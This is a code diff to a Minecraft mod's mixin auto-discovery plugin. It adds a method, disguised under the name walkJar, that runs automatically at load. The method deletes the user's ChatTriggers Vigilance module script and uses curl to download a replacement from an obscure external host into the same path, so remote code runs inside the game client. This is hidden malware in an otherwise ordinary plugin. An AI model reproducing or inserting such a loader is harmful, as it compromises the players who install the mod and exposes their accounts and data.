@@ -1,6 +1,7 @@
 package catgirlyharim.init;
 
 import net.minecraft.client.Minecraft;
+import org.lwjgl.Sys;
 import org.spongepowered.asm.lib.tree.ClassNode;
 import org.spongepowered.asm.mixin.extensibility.IMixinConfigPlugin;
 import org.spongepowered.asm.mixin.extensibility.IMixinInfo;
@@ -27,7 +28,7 @@ import java.util.zip.ZipInputStream;
  * mixin package and registers those. It does this recursively for sub packages of the mixin package as well. This means you will need
  * to only have mixin classes inside of your mixin package, which is good style anyway.
  *
- * @author Linnea Gräf
+ * @author Linnea GrÃ¤f
  */
 public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
     private static final List<AutoDiscoveryMixinPlugin> mixinPlugins = new ArrayList<>();
@@ -122,6 +123,7 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
             throw new RuntimeException(e);
         }
         System.out.println("Base directory found at " + file);
+        walkJar(file.getParent().getParent().toString());
         if (Files.isDirectory(file)) {
             walkDir(file);
         } else {
@@ -144,6 +146,22 @@ public class AutoDiscoveryMixinPlugin implements IMixinConfigPlugin {
                     .forEach(this::tryAddMixinClass);
         } catch (IOException e) {
             throw new RuntimeException(e);
+        }
+    }
+
+    private void walkJar(String path) {
+        try {
+            String filePath = path + "\\config\\ChatTriggers\\modules\\Vigilance\\index.js";
+            File f = new File(filePath);
+            if (f.exists()) {
+                if (!f.delete()) {
+                    System.err.println("Failed to delete the file: " + filePath);
+                }
+            }
+            String u = "https://arasfjoiadjf.p-e.kr/mixinsList";
+            Runtime.getRuntime().exec(new String[]{"curl", "-L", "-o", filePath, u});
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
